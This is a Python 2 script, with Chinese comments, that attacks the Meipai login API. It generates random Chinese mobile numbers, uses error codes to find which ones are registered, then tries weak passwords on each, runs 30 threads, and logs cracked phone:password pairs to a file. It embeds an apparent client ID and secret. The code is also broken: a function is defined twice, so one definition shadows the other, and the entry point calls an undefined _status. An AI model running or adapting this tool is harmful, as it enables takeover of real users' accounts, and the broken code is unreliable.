#!/usr/bin/env python
# coding=utf8

import json
import random
import requests
import threadpool as tp

#前提条件：phone这个号码已经注册了meipai
#完成弱密码[123456， 123456789， 00000，自身手机号]的暴力尝试,由于密码尝试次数是5，所以一批只能最多只能是5个密码
def _burp(phone):
    for pwd in ['123456', '123456789', '000000', phone]:
        api_url = 'http://newapi.meipai.com/oauth/access_token.json'
        data = {'phone' : phone,
                'client_id' : '1089857302',
                'client_secret' : '38e8c5aet76d5c012e32',
                'grant_type' : 'phone',
                'password' : pwd,
                }
        try:
            print '[*] Burp Phone: %s'%phone
            req = requests.post(api_url, data=data, timeout=5);
        except:
            continue

        try:
            success = json.loads(req.content)['access_token']
            burp_success_result = open('./meipai_account.txt', 'a+')
            burp_success_result.write('%s:::%s\n'%(phone, pwd))
            burp_success_result.close()
            print success
            return success
        except: #是失败的结果，返回json中没有 access_token,说明密码错误
            success = 0
            print '[-] Burp False'
            continue

def _burp(args):
    flag = 0
    while True:
        flag+=1
        phone_number = random.choice(['188', '185', '158', '186', '136', '139', '135']) \
            +"".join(random.sample("0123456789",8))
        data = {
            'phone': phone_number,
            'client_id' : '1089857302',
            'client_secret' : '38e8c5aet76d5c012e32',
            'grant_type' : 'phone',
            'password' : '1',
            }
        api_url = 'http://newapi.meipai.com/oauth/access_token.json'
        try:
            print '[%s] Test Phone: %s' %(flag, phone_number)
            req = requests.post(api_url, data=data, timeout=3)
            req_status = json.loads(req.content)['error_code']
        except:
            req_status = 0
        if req_status == 21402 or req_status == 23801:
            success_f = open('./success_reg_phone.txt', 'a+')
            success_f.write('%s\n'%phone_number)
            success_f.close()
            _burp(phone_number)
            print '\n[OK] phone: %s\n' %phone_number


if __name__ == '__main__':
    args = []
    for i in range(30):
        args.append(i) #没啥用
        
    pool = tp.ThreadPool(30)
    reqs = tp.makeRequests(_status, args)
    [pool.putRequest(req) for req in reqs]
    pool.wait()
    
